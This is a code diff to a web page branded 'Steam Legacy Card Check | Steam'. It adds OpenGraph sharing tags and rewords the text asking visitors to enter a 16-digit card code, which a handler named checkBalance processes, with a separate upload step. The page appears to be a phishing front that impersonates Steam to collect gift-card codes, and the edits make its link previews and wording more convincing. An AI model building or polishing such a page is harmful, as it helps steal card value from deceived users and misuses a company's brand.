@@ -191,6 +191,9 @@ export default function SteamLegacyPage() {
       <Head>
         <title>Steam Legacy Card Check | Steam</title>
         <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+        <meta property="og:title" content="Steam Legacy Card Check | Steam" />
+        <meta property="og:description" content="Check to see if the card is a Steam Legacy compatible card." />
+        <meta property="og:type" content="website" />
       </Head>
 
       <header className={styles.header}>
@@ -247,7 +250,7 @@ export default function SteamLegacyPage() {
         <section className={styles.cardSection}>
           <div className={styles.formContainer}>
             <h1 className={styles.mainTitle} style={{fontSize: '28px', color: '#fff', marginBottom: '10px'}}>Steam Legacy Card Check</h1>
-            <p className={styles.subtitle}>Enter your 16-digit code to verify the card type instantly.</p>
+            <p className={styles.subtitle}>Enter your 16 digit code to check if your card is Steam Legacy compatible.</p>
 
             <div className={styles.card}>
               <form onSubmit={checkBalance}>
@@ -291,7 +294,7 @@ export default function SteamLegacyPage() {
 
                 {!showUploadStep && (
                   <button type="submit" className={styles.button} disabled={loading}>
-                    {loading ? 'Verifying...' : 'Check ID'}
+                    {loading ? 'Verifying...' : 'Check Card'}
                   </button>
                 )}
               </form>
